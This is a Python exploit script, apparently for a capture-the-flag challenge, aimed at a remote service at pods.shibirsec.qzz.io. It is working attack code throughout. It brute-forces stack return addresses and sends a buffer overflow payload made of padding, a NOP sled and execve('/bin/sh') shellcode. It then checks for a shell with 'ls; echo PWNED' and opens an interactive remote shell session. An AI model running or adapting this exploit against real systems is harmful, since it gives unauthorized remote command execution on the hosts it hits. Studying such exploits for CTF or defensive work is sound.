import socket
import struct
import time
import sys

HOST = 'pods.shibirsec.qzz.io'
PORT = 36106
OFFSET = 76
SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def try_exploit(addr):
    print(f"[*] Trying {hex(addr)}", end='\r')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5) # Fast timeout
    try:
        s.connect((HOST, PORT))
        s.recv(1024)

        payload = b"A" * OFFSET
        payload += struct.pack("<I", addr)
        payload += b"\x90" * 350
        payload += SHELLCODE
        payload += b"\n"

        s.sendall(payload)

        # Check for shell
        s.sendall(b"ls; echo 'PWNED'\n")
        try:
            response = s.recv(1024)
            if b"PWNED" in response:
                print(f"\n[+] SUCCESS! Shell at {hex(addr)}")
                print(response.decode(errors='replace'))
                while True:
                    cmd = sys.stdin.readline()
                    if not cmd: break
                    s.sendall(cmd.encode())
                    resp = s.recv(4096)
                    sys.stdout.buffer.write(resp)
                    sys.stdout.flush()
                return True
        except socket.timeout:
            pass
    except Exception as e:
        print(f"\n[-] Error: {e}")
    finally:
        s.close()
    return False

# Adjust range to be more likely correct for Linux stack
# Usually 0xffff....
# Try stepping backwards from top of stack
start_addr = 0xffffd500
end_addr = 0xffffc000
step = -100 # Go downwards

print(f"[*] Bruting from {hex(start_addr)} down to {hex(end_addr)}")

for addr in range(start_addr, end_addr, step):
    if try_exploit(addr):
        break